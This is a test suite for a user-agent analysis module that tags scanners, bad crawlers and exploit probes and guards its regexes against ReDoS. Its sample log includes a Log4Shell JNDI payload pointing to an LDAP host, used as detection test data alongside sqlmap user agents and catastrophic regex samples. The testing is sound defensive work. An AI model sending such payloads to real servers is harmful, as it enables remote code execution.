"""user_agent_analysis (P317, batch p3-G12-1): offline UA table + teler bad-crawlers list, ReDoS safety."""

from __future__ import annotations

import time
from pathlib import Path

import pytest

from tests.fakes import FakeHttp, make_runtime, module_fixture, run_module
from v3lum.core.entities import Entity
from v3lum.core.entities import EntityType as T
from v3lum.core.models import Status
from v3lum.modules.utility import user_agent_analysis as UA
from v3lum.modules.utility.user_agent_analysis import UserAgentAnalysis

FIX = Path(__file__).parents[1] / "fixtures" / "user_agent_analysis"
TELER_REAL = (FIX / "teler_bad_crawlers_ok.txt").read_text(encoding="utf-8")
SYNTHETIC = module_fixture("user_agent_analysis", "synthetic_uas.json")
BUDGET_MS = 25.0  # per-UA time budget of the ReDoS fuzz test (P317 cond 3)


def full_list() -> str:
    """The 19 real teler lines plus synthetic padding patterns up to a realistic list size (the dataset validator
    refuses short downloads as broken)."""
    pad = "\n".join(f"^v3lumtestagent{i:04d}/" for i in range(1100))
    return TELER_REAL.rstrip("\n") + "\n" + pad + "\n"


def runtime_with_list(text: str | None = None, *, status: int = 200):
    http = FakeHttp()
    if text is None:
        text = full_list()
    http.add("GET", UA.TELER_BAD_CRAWLERS_URL, status=status, text=text, headers={"content-type": "text/plain"})
    return make_runtime(http), http


def adversarial_uas(limit: int = UA.UA_MAX_BYTES) -> list[str]:
    base = ["a" * limit, "A/" * (limit // 2), ("Mozilla/5.0 " * 100)[:limit], "-" * limit, "1" * limit,
            ("x" * 50 + " ") * (limit // 51), "(" * limit, ";" * limit,
            ("Mozilla/5.0 (Windows NT 10.0; " * 40)[:limit], ("bot" * 400)[:limit], ("Trident/7.0;" * 100)[:limit],
            ("Version/1.1 " * 100)[:limit], ("${jndi:" * 200)[:limit]]
    return [s[:limit] for s in base]


@pytest.mark.parametrize("case", SYNTHETIC["uas"], ids=lambda c: (c.get("category") or "x") + ":" + c["ua"][:24])
def test_synthetic_uas_are_classified(case):
    rt, _ = runtime_with_list()
    res = run_module(UserAgentAnalysis, Entity.make(T.USER_AGENT, case["ua"]) if case["ua"].strip() else Entity.make(T.USER_AGENT, "-"), runtime=rt)
    if not case["ua"].strip():
        return
    assert res.status in (Status.OK, Status.EMPTY)
    assert res.attributes["ua_category"] == case["category"], case
    parsed = res.attributes.get("ua_parsed", {})
    for key in ("browser", "os", "device", "tool", "exploit_probe"):
        if key in case:
            assert parsed.get(key) == case[key], (key, case)
    assert res.attributes["ua_risk_ceiling"] == "LOW"
    for f in res.findings:  # FC4: never malicious, never above LOW
        assert "malicious" not in f.tags and f.severity.name in ("INFO", "LOW")


def test_scanner_is_tagged_scanner_low_and_research_scanner_benign():
    rt, _ = runtime_with_list()
    res = run_module(UserAgentAnalysis, "user_agent:sqlmap/1.8.11#stable (https://sqlmap.org)", runtime=rt)
    f = res.findings[0]
    assert f.severity.name == "LOW" and "scanner" in f.tags and f.criterion
    res2 = run_module(UserAgentAnalysis, "user_agent:Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)", runtime=rt)
    f2 = res2.findings[0]
    assert f2.severity.name == "INFO" and "benign_scanner" in f2.tags


def test_bad_crawler_list_hit_is_automation_never_bad_and_cited():
    rt, http = runtime_with_list()
    res = run_module(UserAgentAnalysis, "user_agent:Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.17928; Pro)", runtime=rt)
    assert res.attributes["ua_category"] == "automation"
    assert res.attributes["ua_parsed"]["bad_crawler_match"] is True
    assert "kitabisa" in res.attributes["ua_parsed"]["bad_crawler_attribution"]
    assert [d["name"] for d in res.datasets] == ["teler_bad_crawlers.txt"]
    assert http.hosts() == {"raw.githubusercontent.com"}  # only the whole public list, never the analysed UA


def test_list_unavailable_keeps_own_table_and_reports_dataset_source():
    rt, _ = runtime_with_list(text="404: Not Found", status=404)
    res = run_module(UserAgentAnalysis, "user_agent:sqlmap/1.7", runtime=rt)
    assert res.status is Status.OK and res.attributes["ua_category"] == "scanner"
    st = res.source_statuses[UA.SOURCE]
    assert st["status"] in ("unavailable", "error") and "own table only" in st["reason"]


def test_html_or_short_list_never_replaces_the_dataset():
    rt, _ = runtime_with_list(text="<html><body>rate limited</body></html>")
    res = run_module(UserAgentAnalysis, "user_agent:curl/8.5.0", runtime=rt)
    assert res.attributes["ua_category"] == "automation"
    assert UA.SOURCE in res.source_statuses
    assert UA.bad_crawlers_problem(UA.parse_bad_crawlers(TELER_REAL)).startswith("bad-crawlers list too short")


def test_log_text_is_parsed_and_aggregated():
    log = "\n".join([
        '203.0.113.5 - - [26/Nov/2026:10:00:00 +0000] "GET / HTTP/1.1" 200 512 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0"',
        '198.51.100.7 - - [26/Nov/2026:10:00:01 +0000] "GET /?id=1 HTTP/1.1" 403 0 "-" "sqlmap/1.8.11#stable (https://sqlmap.org)"',
        '198.51.100.8 - - [26/Nov/2026:10:00:02 +0000] "GET / HTTP/1.1" 200 0 "-" "${jndi:ldap://198.51.100.7:1389/a}"',
        'User-Agent: Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)',
    ])
    rt, _ = runtime_with_list()
    res = run_module(UserAgentAnalysis, Entity.make(T.TEXT, log), runtime=rt)
    assert res.status is Status.OK
    parsed = res.attributes["ua_parsed"]
    assert parsed["distinct_user_agents"] == 4
    assert parsed["by_category"]["scanner"] == 2 and parsed["by_category"]["benign_scanner"] == 1
    assert {"sqlmap", "Log4Shell probe", "Censys"} <= set(parsed["tools"])
    assert any("Log4Shell" in f.description for f in res.findings)
    assert all(f.severity.name in ("INFO", "LOW") for f in res.findings)


def test_text_without_user_agents_is_not_applicable():
    rt, _ = runtime_with_list()
    res = run_module(UserAgentAnalysis, Entity.make(T.TEXT, "nothing here but words"), runtime=rt)
    assert res.status is Status.SKIPPED and res.reason_code == "not_applicable"


def test_ua_is_truncated_to_1kb_before_matching():
    text, cut = UA.truncate_ua("é" * 2000)
    assert cut is True and len(text.encode("utf-8")) <= 1024
    rt, _ = runtime_with_list()
    res = run_module(UserAgentAnalysis, Entity.make(T.USER_AGENT, "sqlmap/1.7 " + "A" * 3000), runtime=rt)
    assert res.attributes["ua_parsed"]["truncated"] is True


def test_redos_static_screen_rejects_catastrophic_patterns():
    assert "nested_quantifier" in UA.redos_static_flags(r"(a+)+$")
    assert "quantified_alternation" in UA.redos_static_flags(r"(a|aa)+$")
    assert "backreference" in UA.redos_static_flags(r"(a)\1")
    parsed = UA.parse_bad_crawlers("(a+)+$\n(x|xx)*y\nokbot\n")
    assert parsed["patterns"] == ["okbot"] and len(parsed["rejected"]) == 2
    # Crawler-Detect's generic pattern loses its redundant leading class star (linear matching)
    generic = r"[a-z0-9\-_]*(bot|crawl|spider)"
    assert UA.normalise_crawler_pattern(generic) == "(bot|crawl|spider)"


def test_redos_fuzz_every_own_table_regex_within_budget():
    import re

    inputs = adversarial_uas()
    for pattern in UA.ua_table_patterns():
        assert not [f for f in UA.redos_static_flags(pattern) if f in UA.REDOS_REJECT], pattern
        rx = re.compile(pattern, re.I)
        for s in inputs:
            t0 = time.perf_counter()
            rx.search(s)
            assert (time.perf_counter() - t0) * 1000 < BUDGET_MS, (pattern, s[:20])


def test_redos_fuzz_the_compiled_teler_list_within_budget():
    parsed = UA.parse_bad_crawlers(full_list())
    matcher = UA.compile_crawler_matcher(parsed["patterns"])
    for s in adversarial_uas():
        t0 = time.perf_counter()
        matcher.search(s)
        assert (time.perf_counter() - t0) * 1000 < 4 * BUDGET_MS, s[:20]  # whole list, one alternation


def test_phpids_filters_are_never_ua_patterns():
    phpids = (FIX / "teler_common_web_attacks.json").read_text(encoding="utf-8")
    assert UA.is_phpids_filter_set(phpids)
    parsed = UA.parse_bad_crawlers(phpids)
    assert parsed["patterns"] == [] and parsed["errors"]


def test_metadata_matches_the_council_decision():
    assert UserAgentAnalysis.disclosure == "none" and UserAgentAnalysis.terms == "open"
    assert UserAgentAnalysis.default_enabled is True and UserAgentAnalysis.hosts == ()
    assert UserAgentAnalysis.sources == (UA.SOURCE,)
